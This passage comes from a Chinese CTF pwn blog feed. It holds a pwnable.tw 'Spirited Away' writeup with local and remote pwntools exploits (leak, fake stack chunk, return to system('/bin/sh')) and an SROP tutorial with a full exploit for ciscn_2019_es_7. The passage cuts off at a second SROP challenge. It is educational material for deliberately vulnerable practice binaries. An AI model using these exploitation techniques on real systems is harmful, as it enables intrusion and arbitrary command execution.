<p><a href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">路由器漏洞分析环境搭建 | Prowes5’s Blog</a></p>
<p><a href="https://zikh26.github.io/posts/919c29c4.html">IOT安全入门学习–MIPS汇编基础 | ZIKH26’s Blog</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-273522.htm#msg_header_h1_4">原创]IDA及插件MIPSROP安装——《揭秘家用路由器0day漏洞挖掘技术》学习笔记-安全工具-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a href="https://gdufs-king.github.io/2021/06/08/ida%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E8%B8%A9%E5%9D%91%E7%BB%8F%E5%8E%86/">ida插件安装踩坑经历 - V1ct0r的博客</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-Spirited Away</title>
    <url>/2024/07/28/Spirited-Away/</url>
    <content><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">survey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">56</span>]; <span class="comment">// [esp+10h] [ebp-E8h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+48h] [ebp-B0h]</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+4Ch] [ebp-ACh]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [esp+50h] [ebp-A8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+A0h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+A4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">80</span>]; <span class="comment">// [esp+A8h] [ebp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  nbytes = <span class="number">60</span>;</span><br><span class="line">  v3 = <span class="number">80</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter your name: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, nbytes);                         <span class="comment">// buf是name</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your age: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);                    <span class="comment">// v5是age</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Why did you came to see this movie? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, v7, v3);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your comment: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Age: %d\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reason: %s\n&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Comment: %s\n\n&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(v1, <span class="string">&quot;%d comment so far. We will review them as soon as we can&quot;</span>, cnt);</span><br><span class="line">  <span class="built_in">puts</span>(v1);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;200 comments is enough!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;choice, <span class="number">3u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">89</span> || choice == <span class="number">121</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(buf);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">78</span> || choice == <span class="number">110</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice.&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数据泄漏"><a href="#数据泄漏" class="headerlink" title="数据泄漏"></a>数据泄漏</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br></pre></td></tr></table></figure>

<p>将<em>buf</em>填满后，<em>printf</em>会打印出<em>buf</em>及其后面的数据。</p>
<h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(v1, <span class="string">&quot;%d comment so far. We will review them as soon as we can&quot;</span>, cnt);</span><br><span class="line"><span class="comment">//sprintf先将cnt的值接到&#x27;%d&#x27;的位置上，然后将整个句子写到v1中</span></span><br></pre></td></tr></table></figure>

<p><em>v1</em>到<em>nbytes</em>的偏移是<code>0xE8-0xB0 = 0x38</code>，而<em>comment so far. We will review them as soon as we can</em>在内存中，占据<code>0x36</code>个字节。如果<code>cnt=100</code>，便可使字符<code>n</code>溢出到<em>nbytes</em>的地址上。<code>n</code>的<em>ascii</em>码是<code>0x6e</code>，所以<em>nbytes</em>就等于<code>0x6e</code>了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202250636.png" alt="1"></p>
<p><code>1</code>的<em>ascii</em>码是<code>0x31</code>，<code>0</code>的<em>ascii</em>码是<code>0x30</code>。对于<code>100</code>，字符<code>1,0,0</code>分别占据一个字节的内存，一共占据三个字节的内存。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>泄漏数据得到<em>libc</em>基地址。</li>
<li>循环使<em>cnt</em>等于<code>100</code>，<code>nbytes = 0x6e</code>，但是<code>0x6e</code>不足以覆盖返回地址。</li>
<li>在输入<em>name</em>时，先在栈上构造一个<em>fake_chunk</em>。然后通过溢出，覆盖栈上的<em>name_chunk_hook</em>为<em>fake_chunk_hook</em>。</li>
<li>再次输入<em>name</em>时，覆盖返回地址为<em>system</em>函数地址。</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h4 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./spirited_away&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;chall.pwnable.tw&quot;,10204)</span></span><br><span class="line"><span class="comment"># debug(p)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc_32.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))-<span class="number">0x1c</span></span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x2908</span></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x1b3d60</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x0804873E</span>,<span class="number">0x080488C9</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x54</span>+p32(stack-<span class="number">0x4c</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4c</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./spirited_away&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10204</span>)</span><br><span class="line"><span class="comment"># debug(p)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))-<span class="number">0x70</span></span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x2908</span></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>))- <span class="number">0xb</span> - libc.sym[<span class="string">&#x27;fflush&#x27;</span>]<span class="comment">#-0x1b3d60</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x0804873E</span>,<span class="number">0x080488C9</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x54</span>+p32(stack+<span class="number">0x8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4c</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>SROP学习总结</title>
    <url>/2024/01/22/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​	<code>ROP(Return Oriented Programming)</code>是利用程序中的一系列<code>ret</code>指令来构造恶意代码执行链。而<code>SROP</code>即利用<code>sigreturn</code>函数完成以上内容。</p>
<span id="more"></span>

<p>这里放一张我看其他师傅博客上的一张图，完成一次系统调用的过程如下：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908627.png" alt="image-20240122163354902"></p>
<p>①：用户态进程接收到信号<code>signal</code>，该进程被挂起，进入内核态。</p>
<p>②：内核保存用户态进程的上下文，然后跳转到用户态的信号<code>signal</code>对应的信号处理程序，回到用户态。在这一阶段里，内核会构造一个位于用户栈上的<code>Signal Frame</code>用于存放该进程的上下文，然后再<code>push</code>返回地址<code>rt_sigreturn</code>。</p>
<p>③：用户态的信号处理程序执行完毕，<code>pop</code>返回地址<code>rt_sigreturn</code>，进程进入内核态，执行<code>sigreturn</code>系统调用。内核根据之前栈上的<code>Signal Frame</code>完成用户态进程上下文的恢复。</p>
<p>④：返回用户态，进程按照恢复的上下文继续执行。</p>
<p>​	<code>SROP</code>作用于第3阶段，也就是内核根据<code>Signal Frame</code>的内容恢复进程上下文的过程。</p>
<p>​	<code>Signal Frame</code>（类似下面这张图）是一个已知的数据结构，而且其存在于用户态的栈上。内核在恢复上下文时并不能确保其内容没有被修改过。因此，如果我们能够在栈上构造<code>sigreturn</code>系统调用与新的<code>Signal Frame</code>结构体的话，就能够实现攻击的效果。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908826.png" alt="image-20240122203103809"></p>
<p>​	<code>sigreturn</code>函数用于从信号处理程序中恢复到原始的系统调用状态，调用号为<code>0xf</code>，通过<code>syscall</code>指令直接调用。在<code>x86-64</code>架构的<code>Linux</code>系统中，<code>syscall</code>指令的调用号存储在寄存器<code>rax</code>中。</p>
<h2 id="srop的做题条件"><a href="#srop的做题条件" class="headerlink" title="srop的做题条件"></a><code>srop</code>的做题条件</h2><ul>
<li>一定要能调用<code>sigreturn</code>，也就是说程序中要有<code>syscall</code>的指令并知道其地址，还需要让<code>rax</code>寄存器值为<code>0xf</code>。</li>
<li>必须要能知道<code>/bin/sh</code>在程序中的地址。</li>
</ul>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a><code>ciscn_2019_es_7</code></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	系统调用了<code>sys_read</code>和<code>sys_write</code>，并且可以溢出<code>0x400-0x10</code>个字节</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908713.png" alt="image-20240122163539371"></p>
<p>​	我们看到<code>mov rax,0fh;retn</code>的<code>gadget</code>，<code>0fh</code>是<code>sigreturn</code>函数的调用号，可以用<code>SROP</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908087.png" alt="image-20240122152721309"></p>
<p>​	程序中没有<code>/bin/sh</code>，我们可以在<code>sys_read(0,buf,0x400ull)</code>这一过程中先把<code>/bin/sh</code>写到<code>buf</code>中，然后<code>sys_write(1u,buf,0x30ull)</code>这一过程会把<code>buf</code>及后面的内容共<code>0x30</code>个字节打印出来，这样我们就可以泄漏一个栈地址，然后计算其与<code>/bin/sh</code>的地址的偏移，表示出<code>/bin/sh</code>的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line">binsh_addr = one_addr-<span class="number">0x148</span></span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>

<p>​	得到<code>/bin/sh</code>的地址后，构造一个<code>execve</code>的<code>signal frame</code>，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = binsh_addr  <span class="comment">#第一个参数</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_addr  <span class="comment">#下面解释</span></span><br></pre></td></tr></table></figure>

<p>​	首先我们要知道，<code>rip</code>是一个指令指针的寄存器，也就是说<code>rip</code>寄存器中存放的是要执行的下一条指令的地址。而<code>frame.rip</code>中存放的是 当<code>sigreturn</code>系统调用返回后要执行的下一条指令的地址。这里的<code>frame.rip = syscall_leave_ret</code>就表示我们将要执行<code>syscall</code>指令，又因为我们已经设置了<code>execve</code>的<code>signal frame</code>，所以我们就控制了程序的执行流执行<code>execve</code>系统调用。</p>
<p>​	构造第二个<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr)  <span class="comment">#sigreturn的调用号是0xf</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>​	一开始我把<code>payload = payload = b&#39;/bin/sh\x00&#39;.ljust(16,b&#39;\x00&#39;)</code>写成<code>payload = b&#39;a&#39;*16</code>打不通。调试的时候发现，<code>vuln</code>函数是又被循环了一次，这个<code>payload</code>是会往<code>buf</code>中写覆盖原来的内容，也就是说我们上面泄漏的地址<code>binsh_addr</code>，中的内容会变成这次发送的前<code>8</code>个字节。所以我们构造的<code>payload</code>的前<code>8</code>个字节必须是<code>/bin/sh\x00</code>。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26868</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./es7&#x27;)</span></span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x148</span></span><br><span class="line">binsh_addr = one_addr-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="comment">#0x148是本地的偏移量，远程的应该是0x118，本地与远程的libc不同</span></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_addr </span><br><span class="line"></span><br><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr) </span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908737.png" alt="image-20240122171324394"></p>
<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a><code>rootersctf_2019_srop</code></h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	我们分析代码，发现连<code>main</code>函数都没有，整个程序就是先<code>call 0x401000</code>，然后<code>exit</code>退出。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909604.png" alt="image-20240206133317497"></p>
<p>​	跳到地址为<code>0x401000</code>这里，分析汇编代码，<code>2</code>个系统调用，<code>write(1,buf,0x2a),read(0,rsp-0x40,0x400)</code>。</p>
